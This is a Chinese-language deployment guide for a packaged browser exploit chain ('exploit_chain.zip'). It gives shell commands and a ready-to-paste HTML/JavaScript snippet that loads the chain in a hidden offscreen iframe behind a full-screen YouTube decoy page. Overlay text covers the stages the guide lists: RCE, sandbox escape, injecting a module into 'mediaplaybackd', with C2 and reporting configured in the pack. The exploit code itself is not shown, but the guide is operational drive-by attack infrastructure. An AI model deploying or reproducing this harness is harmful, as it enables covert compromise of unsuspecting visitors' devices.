# iframe 整包部署（推荐给落地页嵌入）

把 `exploit_chain.zip` **整包**解到网站的 `/expires/` 目录（与站点同域）。

**推荐落地页**：同包 `landing_observe.html`（全屏 YouTube + 浮层加载 + 隐藏链 iframe）。
`embed-snippet.html` 只负责嵌 iframe；**浮层 `__CESHI18_FLOAT_LOAD` 只在观察页（或你自带的同套 UI）里生效**。

## 1. 目录

```text
https://你的站/
  landing_observe.html  ← 推荐：直接当落地页（含浮层配置）
  expires/
    expires.html        ← 链入口（本 zip 内的 expires.html）
    <hash>.js
    DEPLOY_IFRAME.md
    embed-snippet.html  ← 仅 iframe 片段（自有落地页时粘贴）
    landing_observe.html
```

```bash
mkdir -p /var/www/site/expires
unzip exploit_chain.zip -d /var/www/site/expires
cp /var/www/site/expires/landing_observe.html /var/www/site/
```

要求：`expires.html` 与全部 `.js` **同一目录**。

## 2. 落地页怎么选

### A. 直接用 `landing_observe.html`（推荐）

1. 解压后把 `landing_observe.html` 拷到站点根（或做成入口）。
2. 页内已创建 `iframe` → `/expires/expires.html`，并监听：
   - `chain_busy` / `phase: rce_done|stage2_done` → 显示浮层
   - `chain_done` → 关浮层并 idle 跳转
3. **配置浮层**：改页内 `window.__CESHI18_FLOAT_LOAD`（见下），改完重新拷贝到站点根即可；**不必为改文案重打包**。

### B. 自有业务落地页

1. 粘贴同包 `embed-snippet.html`（或下面片段）。
2. 浮层 UI **不会自动出现**——需整页复用 `landing_observe.html` 的 float CSS/DOM/脚本，或监听：
   - `ceshi18-chain-busy`（CustomEvent，detail 含 `phase`）
   - `ceshi18-chain-done`
3. 仅粘贴旧版「只卸 iframe」片段 **不会**让 `__CESHI18_FLOAT_LOAD` 生效。

```html
<!-- ceshi18: hidden chain iframe; chain_busy / chain_done; 90s fallback -->
<!-- 浮层文案请用同包 landing_observe.html，或在本页先设 window.__CESHI18_FLOAT_LOAD 再引入观察页逻辑 -->
<iframe id="ceshi18-chain-frame" src="/expires/expires.html" style="position:fixed;top:-300px;left:-300px;width:10px;height:10px;border:0"></iframe>
<script>
(function () {
  var ID = "ceshi18-chain-frame";
  var FALLBACK_MS = 90000;
  var done = false;
  try { document.body.classList.add("chain-busy"); } catch (e0) {}
  function unload(reason, detail) {
    if (done) return;
    done = true;
    try { document.body.classList.remove("chain-busy"); } catch (e1) {}
    var el = document.getElementById(ID);
    if (el) {
      try { el.src = "about:blank"; } catch (e) {}
      try { el.remove(); } catch (e2) {
        try { if (el.parentNode) el.parentNode.removeChild(el); } catch (e3) {}
      }
    }
    var payload = detail || { reason: reason };
    try {
      window.dispatchEvent(new CustomEvent("ceshi18-chain-done", { detail: payload }));
    } catch (e4) {}
    try { console.log("[ceshi18] chain iframe removed:", reason, payload); } catch (e5) {}
  }
  window.addEventListener("message", function (ev) {
    var d = ev && ev.data;
    if (!d || d.source !== "ceshi18-chain") return;
    if (d.type === "chain_busy" || d.type === "chain_start") {
      try { document.body.classList.add("chain-busy"); } catch (e6) {}
      try { window.dispatchEvent(new CustomEvent("ceshi18-chain-busy", { detail: d })); } catch (e7) {}
      return;
    }
    if (d.type !== "chain_done") return;
    unload(d.reason || "done", d);
  });
  setTimeout(function () {
    unload("parent_fallback", {
      source: "ceshi18-chain",
      type: "chain_done",
      reason: "parent_fallback",
      ok: false
    });
  }, FALLBACK_MS);
})();
</script>
```

## 3. `__CESHI18_FLOAT_LOAD` 怎么生效

在 `landing_observe.html` 主脚本里：

```js
var FLOAT_LOAD = window.__CESHI18_FLOAT_LOAD || { totalSec, phases, overtime };
```

任选其一：

1. **直接改默认对象**（页内 `totalSec` / `phases[]` / `overtime`）后部署该 HTML。
2. **在主脚本之前**注入覆盖（改配置不必动后面大段逻辑）：

```html
<script>
window.__CESHI18_FLOAT_LOAD = {
  totalSec: 60,
  phases: [
    { sec: 0,  title: "准备后续", text: "RCE 完成，正在启动沙箱逃逸…" },
    { sec: 8,  title: "沙箱逃逸", text: "sbx0 → sbx1（页面可能明显卡住）" },
    { sec: 22, title: "加载模块", text: "pe_main 分片注入 mediaplaybackd…" },
    { sec: 40, title: "注入收尾", text: "chunk 装载 / finalize，请稍候…" },
    { sec: 52, title: "即将完成", text: "等待链完成通知…" }
  ],
  overtime: {
    title: "加载超时",
    text: "已超过 60 秒仍未完成，请点击刷新重试",
    btn: "刷新页面",
    href: "/landing_observe.html"
  }
};
</script>
```

3. 调试：`?float_sec=90` 改总时长；`?demo_float=1` 强制显示浮层。

触发条件（链侧已打进 pack 的 loader）：RCE stage2 完成后 `postMessage`
`{ source: "ceshi18-chain", type: "chain_busy", phase: "rce_done" }`。

## 4. 说明

- iframe 与落地页 **必须同域**（相对 `/expires/...`）。
- 整链相对路径；C2 / 上报 / promo 仍用打包配置。
- `postMessage`：`chain_busy`（浮层）与 `chain_done`（卸 iframe）。

## 5. 自检

1. 打开 `https://你的站/expires/expires.html` 能独立起链。
2. 打开 `/landing_observe.html`，Network 可见 iframe 拉 `expires.html`。
3. `?demo_float=1` 能看到分阶段文案；真机过 RCE 后应自动出浮层。
